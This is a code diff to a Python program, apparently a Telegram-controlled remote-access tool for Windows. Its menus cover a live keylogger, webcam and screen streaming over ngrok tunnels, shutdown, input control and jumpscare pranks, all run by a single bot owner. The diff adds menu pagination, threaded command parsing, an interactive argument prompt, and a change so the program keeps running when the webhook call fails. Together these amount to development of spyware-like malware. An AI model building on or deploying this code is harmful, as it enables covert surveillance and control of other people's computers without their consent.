@@ -446,6 +446,9 @@ def get_current_wallpaper():
     path = buffer.value
     return path if isfile(path) else None
 
+def get_function_parameters(function: callable) -> list[str]:
+    return function.__code__.co_varnames[:function.__code__.co_argcount]
+
 def backup_wallpaper(backup_path):
     current_wallpaper = get_current_wallpaper()
     if exists(current_wallpaper):
@@ -864,7 +867,6 @@ class ButtonsMenu:
         self.close_btn_lab = close_btn_lab
         self.sent = False
 
-        self.keyboard = self.create_keyboard()
         if autosend:
             self.send_keyboard()
 
@@ -885,10 +887,19 @@ class ButtonsMenu:
         return InlineKeyboardMarkup(inline_keyboard=keyboard_rows)
 
     def send_keyboard(self) -> int:
+        self.keyboard = self.create_keyboard()
         self.sent = True
         self.message_id = self.bot.sendMessage(self.chat_id, self.label, reply_markup=self.keyboard)["message_id"]
         return self.message_id
+
+    def send_next_page(self) -> None:
+        self._page += 1
+        self.send_keyboard()
     
+    def send_previous_page(self) -> None:
+        self._page -= 1
+        self.send_keyboard()
+
     def edit_keyboard(self, buttons: dict) -> int:
         self.buttons = buttons
         self.keyboard = self.create_keyboard()
@@ -1145,6 +1156,11 @@ class PeppinoTelegram:
         self.loading_bar_set = loading_bar_set
         self.loading_bar_spinner = loading_bar_spinner
 
+        self.user = {
+            "status":None,             #can be "input_requested" or None 
+            "last_response":None       #can be None, or the last response of an input
+        }
+
         self.webcam_url = None
         self.screen_url = None
         self.webcam_and_screen_url = None
@@ -1176,6 +1192,7 @@ class PeppinoTelegram:
             "psst":self.pss,
             "bsend":self.bsend,
             "stop":self.stop,
+            "test":self.test,
             "altf4":self.altf4,
             "breath":self.breath,
             "browser":browseropen,
@@ -1409,8 +1426,9 @@ class PeppinoTelegram:
 
         if chat_id == self.owner_id:
             self.owner_name = sender_name
+
             if content_type == "text":
-                self.parse_text(msg) 
+                Thread(target=self.parse_text, args=(msg,)).start()
             elif content_type == "photo":
                 self.parse_photo(msg)
             elif content_type == "document":
@@ -1505,9 +1523,9 @@ class PeppinoTelegram:
                     buffer=""
         self.bsend("Live keylogger done")
 
-    def message_box(self, text: str, title: str = "Warning", style: int = 0x1000) -> int:
+    def message_box(self, text: str, title: str = "Warning") -> int:
         def run():
-            ctypes.windll.user32.MessageBoxW(0, text, title, style)
+            ctypes.windll.user32.MessageBoxW(0, text, title, 0x1000)
         Thread(target=run, daemon=True).start()
 
     def mixer_menu(self) -> None:
@@ -1589,7 +1607,7 @@ class PeppinoTelegram:
         }
         if self.mainmenu_ref:
             self.mainmenu_ref.delete()
-        self.mainmenu_ref = self.new_menu(buttons, label="🛑 System & Shutdown", close_btn_lab="mainmenu_close")
+        self.mainmenu_ref = self.new_menu(buttons, label="🛑 System & Shutdown", close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
         return self.mainmenu_ref
 
     def menu_network(self):
@@ -1601,7 +1619,7 @@ class PeppinoTelegram:
 
         if self.mainmenu_ref:
             self.mainmenu_ref.delete()
-        self.mainmenu_ref = self.new_menu(buttons, label="🌐 Network & Remote Access", close_btn_lab="mainmenu_close")
+        self.mainmenu_ref = self.new_menu(buttons, label="🌐 Network & Remote Access", close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
         return self.mainmenu_ref
 
     def menu_camera(self):
@@ -1625,7 +1643,7 @@ class PeppinoTelegram:
 
         if self.mainmenu_ref:
             self.mainmenu_ref.delete()
-        self.mainmenu_ref = self.new_menu(buttons, label="📸 Camera & Screen", next_btn=True, close_btn_lab="mainmenu_close")
+        self.mainmenu_ref = self.new_menu(buttons, label="📸 Camera & Screen", next_btn=True, close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
         return self.mainmenu_ref
 
     def menu_audio(self):
@@ -1644,7 +1662,7 @@ class PeppinoTelegram:
 
         if self.mainmenu_ref:
             self.mainmenu_ref.delete()
-        self.mainmenu_ref = self.new_menu(buttons, label="🔊 Audio & Volume", next_btn=True, close_btn_lab="mainmenu_close")
+        self.mainmenu_ref = self.new_menu(buttons, label="🔊 Audio & Volume", next_btn=True, close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
         return self.mainmenu_ref
 
     def menu_pranks(self):
@@ -1662,7 +1680,7 @@ class PeppinoTelegram:
 
         if self.mainmenu_ref:
             self.mainmenu_ref.delete()
-        self.mainmenu_ref = self.new_menu(buttons, label="😈 Pranks & Visuals", next_btn=True, close_btn_lab="mainmenu_close")
+        self.mainmenu_ref = self.new_menu(buttons, label="😈 Pranks & Visuals", next_btn=True, close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
         return self.mainmenu_ref
 
     def menu_control(self):
@@ -1677,7 +1695,7 @@ class PeppinoTelegram:
         }
         if self.mainmenu_ref:
             self.mainmenu_ref.delete()
-        self.mainmenu_ref = self.new_menu(buttons, label="💻 System Control", close_btn_lab="mainmenu_close")
+        self.mainmenu_ref = self.new_menu(buttons, label="💻 System Control", close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
         return self.mainmenu_ref
 
     def menu_input(self):
@@ -1693,7 +1711,7 @@ class PeppinoTelegram:
 
         if self.mainmenu_ref:
             self.mainmenu_ref.delete()
-        self.mainmenu_ref = self.new_menu(buttons, label="🎮 Input / Device Control", close_btn_lab="mainmenu_close")
+        self.mainmenu_ref = self.new_menu(buttons, label="🎮 Input / Device Control", close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
         return self.mainmenu_ref
 
     def menu_messaging(self):
@@ -1707,7 +1725,7 @@ class PeppinoTelegram:
 
         if self.mainmenu_ref:
             self.mainmenu_ref.delete()
-        self.mainmenu_ref = self.new_menu(buttons, label="📋 Messaging", close_btn_lab="mainmenu_close")
+        self.mainmenu_ref = self.new_menu(buttons, label="📋 Messaging", close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
         return self.mainmenu_ref
 
     def menu_cantopen(self):
@@ -1720,7 +1738,7 @@ class PeppinoTelegram:
 
         if self.mainmenu_ref:
             self.mainmenu_ref.delete()
-        self.mainmenu_ref = self.new_menu(buttons, label="🔒 Can't Open List", close_btn_lab="mainmenu_close")
+        self.mainmenu_ref = self.new_menu(buttons, label="🔒 Can't Open List", close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
         return self.mainmenu_ref
 
     def menu_keylogger(self):
@@ -1732,7 +1750,7 @@ class PeppinoTelegram:
 
         if self.mainmenu_ref:
             self.mainmenu_ref.delete()
-        self.mainmenu_ref = self.new_menu(buttons, label="🧠 Keylogger", close_btn_lab="mainmenu_close")
+        self.mainmenu_ref = self.new_menu(buttons, label="🧠 Keylogger", close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
         return self.mainmenu_ref
 
     def menu_misc(self):
@@ -1750,7 +1768,7 @@ class PeppinoTelegram:
 
         if self.mainmenu_ref:
             self.mainmenu_ref.delete()
-        self.mainmenu_ref = self.new_menu(buttons, label="🦑 Misc", next_btn=True, close_btn_lab="mainmenu_close")
+        self.mainmenu_ref = self.new_menu(buttons, label="🦑 Misc", next_btn=True, close_btn_lab="mainmenu_close", next_btn_lab="mainmenu_next", prev_btn_lab="mainmenu_prev")
         return self.mainmenu_ref
 
     def new_editable_message(self, content: str, autosend: bool=True) -> EditableMessage:
@@ -1770,7 +1788,7 @@ class PeppinoTelegram:
 
     def on_callback_query(self, msg) -> None:
         query_id, from_id, data = glance(msg, flavor="callback_query")
-        self.parse_command(data) 
+        Thread(target=self.parse_command, args=(data, )).start()
         self.bot.answerCallbackQuery(query_id)
 
     def opencap(self) -> None:
@@ -1815,7 +1833,16 @@ class PeppinoTelegram:
                         new_thread = Thread(target=func)
                     new_thread.start()
             except TypeError as e:
-                self.bsend(f"Invalid args for function {command}\n{e}")
+                #self.bsend(f"Invalid args for function {command}\n{e}")
+                function_args = get_function_parameters(func)
+                args = {} 
+                for arg in function_args:
+                    if arg == "self":
+                        continue
+                    response = self.send_prompt(f"Choose a {arg} for {command}")
+                    print(f"Arg: {arg} {response=}")
+                    args[arg] = response
+                self.parse_command(f"/{command} " + " ".join(args.values()))
             except Exception as e:
                 self.bsend(f"Unhandled error for function {command}\n{e}")
 
@@ -1864,7 +1891,12 @@ class PeppinoTelegram:
             if self.mainmenu_ref:
                 if command == "mainmenu_close":
                     self.mainmenu_ref.delete()
-
+                elif command == "mainmenu_next":
+                    self.mainmenu_ref.delete()
+                    self.mainmenu_ref.send_next_page()
+                elif command == "mainmenu_prev":
+                    self.mainmenu_ref.delete()
+                    self.mainmenu_ref.send_previous_page()
         else:
             self.bsend(f"Invalid command {command}")
 
@@ -1962,14 +1994,17 @@ class PeppinoTelegram:
         date = int(msg["date"])
         if (date+self.message_timeout)<time():
             return
-        if text == "/start":
-            return None
-        elif ";" in text:
-            commands = text.split(";")
-            for command in commands:
-                self.parse_command(command) 
-        else:
-            self.parse_command(text)
+        if self.user["status"] is None:
+            if text == "/start":
+                return None
+            elif ";" in text:
+                commands = text.split(";")
+                for command in commands:
+                    self.parse_command(command) 
+            else:
+                self.parse_command(text)
+        elif self.user["status"] == "input_requested":
+            self.user["last_response"] = text.strip()
 
     def plankton(self, audio=True) -> None:
         self.jumpscare("plankton_meme", "plankton", playaudio=audio, setvolume=50)
@@ -2397,12 +2432,26 @@ class PeppinoTelegram:
         else:
             self.bsend("You cant use tunnel because you didn't provide a ngrok token.")
 
+    def send_prompt(self, question: str) -> str:
+        self.bsend(question)
+        self.user["status"]="input_requested"
+        self.user["last_response"]=None
+        while not self.user["last_response"]:
+            print(self.user)
+            sleep(0.5)
+        else:
+            tmp = self.user["last_response"]
+            self.user["last_response"]=None
+            self.user["status"] = None
+            return tmp
+
     def start(self) -> None:
         #Getting rid of old shi
         try:
             self.bot.deleteWebhook()
         except MaxRetryError:
-            sys.exit() 
+            #don't care
+            ...
         self.bot.getUpdates()
         self.images = load_images()
         self.update_commands()
@@ -2440,6 +2489,10 @@ class PeppinoTelegram:
         self.stop_screen_tunnel()
         self.stop_webcam_tunnel()
         sys.exit()
+
+    def test(self) -> None: #this is a test command
+        response = self.send_prompt("Name: ")
+        print(f"{response=}")
 
     def update_commands(self) -> bool:
         self.commands = self.extract_commands()
